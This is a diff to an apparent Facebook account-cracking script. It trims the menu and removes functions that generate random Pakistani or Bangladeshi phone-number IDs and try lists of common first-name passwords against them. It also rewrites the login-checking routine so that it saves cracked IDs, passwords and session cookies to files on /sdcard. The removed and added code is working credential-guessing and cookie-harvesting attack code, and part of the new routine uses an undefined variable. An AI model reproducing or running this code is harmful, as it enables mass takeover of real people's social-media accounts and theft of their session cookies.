@@ -1130,20 +1130,13 @@ def rehan():
 	os.system('clear')
 	print(logo)
 	print('[1] RANDOM PAK CLONING')
-	print('[2] RANDOM BD CLONING')
-	print('[3] RANDOM CHOICE PASS CLONING')
-	print('[4] CONTACT WITH OWNER')
+
 	print('[0] EXIT')
 	lines()
 	gh = input('[•] CHOOSE : ')
 	if gh =='1':
 		menu()
-	elif gh =='2':
-		bd()
-	elif gh =='3':
-		chos()
-	elif gh =='4':
-		os.system('xdg-open https://www.facebook.com/MUMT4Z.SH4H.SW4TI')
+	
 	elif gh =='0':
 		print('[•] THANKS FOR USE ')
 		time.sleep(3)
@@ -1157,25 +1150,13 @@ def menu():
 	os.system('clear')
 	print(logo)
 	print('[1] LAST 7 DIGIT')
-	print('[2] ALI + KHAN PASS')
-	print('[3] MALIK + BALOCH PASS')
-	print('[4] BEST FOR PUBG IDS')
-	print('[5] BEST FOR FREE FIRE IDS')
+	
 	print('[0] EXIT TO MAIN MENU')
 	lines()
 	opt = input('[•] CHOOSE: ')
 	if opt =='1':
 		svn_digit()
-	elif opt =='2':
-		ali_khan()
-	elif opt =='3':
-		malik_baloch()
-	elif opt =='4':
-		pubg()
-	elif opt =='5':
-		ff()
-	elif opt =='0':
-		rehan()
+	
 	else:
 		print('\n\033[1;37m[•] Choose valid option\033[0;97m')
 		time.sleep(2)
@@ -1218,233 +1199,6 @@ def svn_digit():
 
 #____
 
-def ali_khan():
-	user=[]
-	os.system('clear')
-	print(logo)
-	print('[•] EXAMPLE :92318,92345,92323,92306.ETC')
-	lines()
-	kode = input('[•]\033[1;37m PUT YOUR SIM CODE : ')
-	os.system('clear')
-	print(logo)
-	print('[•] MAX LIMIT [50000]')
-	lines()
-	limit = int(input('[•] ENTER LIMIT :  '))
-	for nmbr in range(limit):
-		nmp = ''.join(random.choice(string.digits) for _ in range(7))
-		user.append(nmp)
-	with ThreadPool(max_workers=30) as yaari:
-		os.system('clear')
-		print(logo)
-		tl = str(len(user))
-		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
-		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
-		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mALI + KHAN')
-		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
-		lines()
-		for guru in user:
-			uid = kode+guru
-			pwx = [guru,'fiderana','Fiderana','lafatra','fahendrena','Fahendrena','amboara','Amboara','miangaly','Miangaly','miangola','Miangola','fanasina','Fanasina','finoanq','Finoana','fandresena','Fandresena','nantenaina','rakotomalala','Rakotomalala','tanjona','Tanjona','solofo','Solofo','Nantenaina','nilaina','Nilaina','nirina','Nirina','Narindra','Rakoto','nomena','Nomena','Anjara','anjara','faniry','Faniry','rakoto','safidy','hasina','Hasina','tsilavina','Tsilavina','finaritra','Finaritra','fanomezana','Fanomezana','Sarindra','sarindra','nambinina','Nambinina','Sitraka','sitraka','mamitiana','Mamitiana','vololona','Vololona','mamisoa','Mamisoa','fanomezantsoa','Fanomezantsoa','fanantenana','Fanantenana','narindra','Narindra','sarobidy','Sarobidy','andriatsitohaina','Andriatsitohaina','lalaina','Lafatra','Jessica','Lalaina','mahery','Mahery','jessica','mandresy','Mandresy','harena','Harena']
-			yaari.submit(fcrack,uid,pwx,tl)
-	print('[✓] Crack process has been completed')
-	print('[?] Ids saved in ok.txt,cp.txt')
-	input('Press Inter To Back Menu')
-	rehan()
-
-#____________
-
-
-
-
-
-#_______
-
-def malik_baloch():
-	user=[]
-	os.system('clear')
-	print(logo)
-	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
-	lines()
-	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
-	os.system('clear')
-	print(logo)
-	print('[•] MAX LIMIT [50000]')
-	lines()
-	limit = int(input('[•] ENTER LIMIT :  '))
-	for nmbr in range(limit):
-		nmp = ''.join(random.choice(string.digits) for _ in range(7))
-		user.append(nmp)
-	with ThreadPool(max_workers=60) as yaari:
-		os.system('clear')
-		print(logo)
-		tl = str(len(user))
-		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
-		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
-		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mMALIK + BALOCH')
-		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
-		lines()
-		for guru in user:
-			uid = kode+guru
-			pwx = [guru,'fiderana','Fiderana','lafatra','fahendrena','Fahendrena','amboara','Amboara','miangaly','Miangaly','miangola','Miangola','fanasina','Fanasina','finoanq','Finoana','fandresena','Fandresena','nantenaina','rakotomalala','Rakotomalala','tanjona','Tanjona','solofo','Solofo','Nantenaina','nilaina','Nilaina','nirina','Nirina','Narindra','Rakoto','nomena','Nomena','Anjara','anjara','faniry','Faniry','rakoto','safidy','hasina','Hasina','tsilavina','Tsilavina','finaritra','Finaritra','fanomezana','Fanomezana','Sarindra','sarindra','nambinina','Nambinina','Sitraka','sitraka','mamitiana','Mamitiana','vololona','Vololona','mamisoa','Mamisoa','fanomezantsoa','Fanomezantsoa','fanantenana','Fanantenana','narindra','Narindra','sarobidy','Sarobidy','andriatsitohaina','Andriatsitohaina','lalaina','Lafatra','Jessica','Lalaina','mahery','Mahery','jessica','mandresy','Mandresy','harena','Harena']
-			yaari.submit(fcrack,uid,pwx,tl)
-	print('[✓] Crack process has been completed')
-	print('[?] Ids saved in ok.txt,cp.txt')
-	input('Press Inter To Back Menu')
-	rehan()
-
-#____
-
-def pubg():
-	user=[]
-	os.system('clear')
-	print(logo)
-	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
-	lines()
-	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
-	os.system('clear')
-	print(logo)
-	print('[•] MAX LIMIT [50000]')
-	lines()
-	limit = int(input('[•] ENTER LIMIT :  '))
-	for nmbr in range(limit):
-		nmp = ''.join(random.choice(string.digits) for _ in range(7))
-		user.append(nmp)
-	with ThreadPool(max_workers=30) as yaari:
-		os.system('clear')
-		print(logo)
-		tl = str(len(user))
-		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
-		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
-		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mPUBG')
-		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
-		lines()
-		for guru in user:
-			uid = kode+guru
-			pwx = [guru,'fiderana','Fiderana','lafatra','fahendrena','Fahendrena','amboara','Amboara','miangaly','Miangaly','miangola','Miangola','fanasina','Fanasina','finoanq','Finoana','fandresena','Fandresena','nantenaina','rakotomalala','Rakotomalala','tanjona','Tanjona','solofo','Solofo','Nantenaina','nilaina','Nilaina','nirina','Nirina','Narindra','Rakoto','nomena','Nomena','Anjara','anjara','faniry','Faniry','rakoto','safidy','hasina','Hasina','tsilavina','Tsilavina','finaritra','Finaritra','fanomezana','Fanomezana','Sarindra','sarindra','nambinina','Nambinina','Sitraka','sitraka','mamitiana','Mamitiana','vololona','Vololona','mamisoa','Mamisoa','fanomezantsoa','Fanomezantsoa','fanantenana','Fanantenana','narindra','Narindra','sarobidy','Sarobidy','andriatsitohaina','Andriatsitohaina','lalaina','Lafatra','Jessica','Lalaina','mahery','Mahery','jessica','mandresy','Mandresy','harena','Harena']
-			yaari.submit(fcrack,uid,pwx,tl)
-	print('[✓] Crack process has been completed')
-	print('[?] Idz saved in [ok.txt,cp.txt]')
-	input('Press Enter To Go Back To Menu')
-	rehan()
-
-#____
-
-def ff():
-	user=[]
-	os.system('clear')
-	print(logo)
-	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
-	lines()
-	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
-	os.system('clear')
-	print(logo)
-	print('[•] MAX LIMIT [50000]')
-	lines()
-	limit = int(input('[•] ENTER LIMIT :  '))
-	for nmbr in range(limit):
-		nmp = ''.join(random.choice(string.digits) for _ in range(7))
-		user.append(nmp)
-	with ThreadPool(max_workers=30) as yaari:
-		os.system('clear')
-		print(logo)
-		tl = str(len(user))
-		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
-		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
-		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mFREE FIRE')
-		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
-		lines()
-		for guru in user:
-			uid = kode+guru
-			pwx = [guru,'fiderana','Fiderana','lafatra','fahendrena','Fahendrena','amboara','Amboara','miangaly','Miangaly','miangola','Miangola','fanasina','Fanasina','finoanq','Finoana','fandresena','Fandresena','nantenaina','rakotomalala','Rakotomalala','tanjona','Tanjona','solofo','Solofo','Nantenaina','nilaina','Nilaina','nirina','Nirina','Narindra','Rakoto','nomena','Nomena','Anjara','anjara','faniry','Faniry','rakoto','safidy','hasina','Hasina','tsilavina','Tsilavina','finaritra','Finaritra','fanomezana','Fanomezana','Sarindra','sarindra','nambinina','Nambinina','Sitraka','sitraka','mamitiana','Mamitiana','vololona','Vololona','mamisoa','Mamisoa','fanomezantsoa','Fanomezantsoa','fanantenana','Fanantenana','narindra','Narindra','sarobidy','Sarobidy','andriatsitohaina','Andriatsitohaina','lalaina','Lafatra','Jessica','Lalaina','mahery','Mahery','jessica','mandresy','Mandresy','harena','Harena']
-			yaari.submit(fcrack,uid,pwx,tl)
-	print('[✓] Crack process has been completed')
-	print('[?] Idz saved in [ok.txt,cp.txt]')
-	input('Press Enter To Go Back To Menu')
-	rehan()
-
-#___________
-
-def bd():
-	user=[]
-	os.system('clear')
-	print(logo)
-	print('[•] EXAMPLE : 088***,88***,88****,88****,.ETC')
-	lines()
-	kode = input('[•]\033[1;37m PUT YOUR SIM CODE : ')
-	os.system('clear')
-	print(logo)
-	print('[•] MAX LIMIT [50000]')
-	lines()
-	limit = int(input('[•] ENTER LIMIT :  '))
-	for nmbr in range(limit):
-		nmp = ''.join(random.choice(string.digits) for _ in range(7))
-		user.append(nmp)
-	with ThreadPool(max_workers=70) as yaari:
-		os.system('clear')
-		print(logo)
-		tl = str(len(user))
-		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
-		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
-		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mBANGLA')
-		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
-		lines()
-		for guru in user:
-			uid = kode+guru
-			pwx = [guru,'fiderana','Fiderana','lafatra','fahendrena','Fahendrena','amboara','Amboara','miangaly','Miangaly','miangola','Miangola','fanasina','Fanasina','finoanq','Finoana','fandresena','Fandresena','nantenaina','rakotomalala','Rakotomalala','tanjona','Tanjona','solofo','Solofo','Nantenaina','nilaina','Nilaina','nirina','Nirina','Narindra','Rakoto','nomena','Nomena','Anjara','anjara','faniry','Faniry','rakoto','safidy','hasina','Hasina','tsilavina','Tsilavina','finaritra','Finaritra','fanomezana','Fanomezana','Sarindra','sarindra','nambinina','Nambinina','Sitraka','sitraka','mamitiana','Mamitiana','vololona','Vololona','mamisoa','Mamisoa','fanomezantsoa','Fanomezantsoa','fanantenana','Fanantenana','narindra','Narindra','sarobidy','Sarobidy','andriatsitohaina','Andriatsitohaina','lalaina','Lafatra','Jessica','Lalaina','mahery','Mahery','jessica','mandresy','Mandresy','harena','Harena']
-			yaari.submit(fcrack,uid,pwx,tl)
-	print('[✓] Crack process has been completed')
-	print('[?] Ids saved in ok.txt,cp.txt')
-	input('Press Inter To Back Menu')
-	rehan()
-
-def chos():
-    user=[]
-    twf =[]
-    os.getuid
-    os.geteuid
-    os.system("clear")
-    print(logo)
-    print('\x1b[1;91m[•] YOUR SIM CODE: ')
-    lines()
-    code = input(' Your Code : ')
-    lines()
-    os.system('clear')
-    print(logo)
-    print('[•] MAX LIMIT [50000]')
-    lines()
-    limit = int(input('[•] LIMIT :  '))
-    for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(7))
-        user.append(nmp)
-    os.system("clear")
-    print(logo)
-    print('[•] EXAMPLE :  1,2,3,4,5,6,7,8,9,Etc')
-    lines()
-    passx = int(input("[•] ENTER PASSWORD LIMIT : "))
-    HamiiID = []
-    os.system('clear')
-    print(logo)
-    print('[•] EXAMPLE : khan12345,bangladish,baloch,Etc')
-    lines()
-    for bilal in range(passx):
-        pww = input(f"[•] ENTER PASSWORDS {bilal+1} : ")
-        HamiiID.append(pww)
-    with ThreadPool(max_workers=70) as manshera:
-        os.system('clear')
-        print(logo)
-        tl = str(len(user))
-        lines()
-        for love in user:
-            pwx = [love,'fiderana','Fiderana','lafatra','fahendrena','Fahendrena','amboara','Amboara','miangaly','Miangaly','miangola','Miangola','fanasina','Fanasina','finoanq','Finoana','fandresena','Fandresena','nantenaina','rakotomalala','Rakotomalala','tanjona','Tanjona','solofo','Solofo','Nantenaina','nilaina','Nilaina','nirina','Nirina','Narindra','Rakoto','nomena','Nomena','Anjara','anjara','faniry','Faniry','rakoto','safidy','hasina','Hasina','tsilavina','Tsilavina','finaritra','Finaritra','fanomezana','Fanomezana','Sarindra','sarindra','nambinina','Nambinina','Sitraka','sitraka','mamitiana','Mamitiana','vololona','Vololona','mamisoa','Mamisoa','fanomezantsoa','Fanomezantsoa','fanantenana','Fanantenana','narindra','Narindra','sarobidy','Sarobidy','andriatsitohaina','Andriatsitohaina','lalaina','Lafatra','Jessica','Lalaina','mahery','Mahery','jessica','mandresy','Mandresy','harena','Harena']
-            uid = code+love
-            for Eman in HamiiID:
-                pwx.append(Eman)
-                pwx.append(love)
-            manshera.submit(fcrack,uid,pwx,tl)
-    print('Crack process has been completed')
-    print('Ids saved in ok.txt,cp.txt')
-    rehan()
-#_____
 def fcrack(uid,pwx,tl):
     #print(user)
     global loop
@@ -1504,22 +1258,32 @@ def fcrack(uid,pwx,tl):
 			"sec-ch-prefers-color-scheme": "light",
 
 			'user-agent': pro}
-            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
-            log_cookies=session.cookies.get_dict().keys()
-            #print(iid+'|'+pws+'|'+str(log_cookies))
-            if 'c_user' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[151:166]
-                print('\033[1;32m[ABKHANX-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
-                open('ABKHANX-OK.txt', 'a').write(cid+' | '+ps+ '\n')
-                oks.append(cid)
-                break
-            elif 'checkpoint' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[141:152]
-                # print('\033[1;33m[ABKHANX-CP] '+uid+' | '+ps+'\x1b[1;97m')
-                open('ABKHANX-CP.txt', 'a').write(uid+' | '+ps+'\n')
-                cps.append(cid)
+        
+            if 'session_key' in reqx:
+                try:
+                    uid=reqx['uid']
+                except:
+                    uid=ids
+                if str(uid) in oks:
+                    break
+                else:
+                    print('\r\r \033[1;32m[SAFIDY-OK] '+str(uid)+' | '+pas+'\033[1;37m')
+                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
+                    print('\033[1;32m [COOKIES] '+coki)
+                    # Vérifier si le dossier SAFIDY-IDS existe et le créer si nécessaire
+                    if not os.path.exists("/sdcard/SAFIDY-IDS"):
+                        os.makedirs("/sdcard/SAFIDY-IDS")
+                    # Enregistrer dans le fichier SAFIDY-OK.txt
+                    with open(os.path.join("/sdcard/SAFIDY-IDS", "SAFIDY-OK.txt"), 'a') as f:
+                        f.write(str(uid)+'|'+pas+'|'+coki+'\n')
+                    oks.append(str(uid))
+                    break
+            elif 'www.facebook.com' in reqx['error_msg']:
+                print('\r\r \033[1;30m[SAFIDY-CP] '+ids+' | '+pas+'\033[1;37m')
+                # Enregistrer dans le fichier SAFIDY-CP.txt
+                with open(os.path.join("/sdcard/SAFIDY-IDS", "SAFIDY-CP.txt"), 'a') as f:
+                    f.write(ids+'|'+pas+'\n')
+                cps.append(ids)
                 break
             else:
                 continue
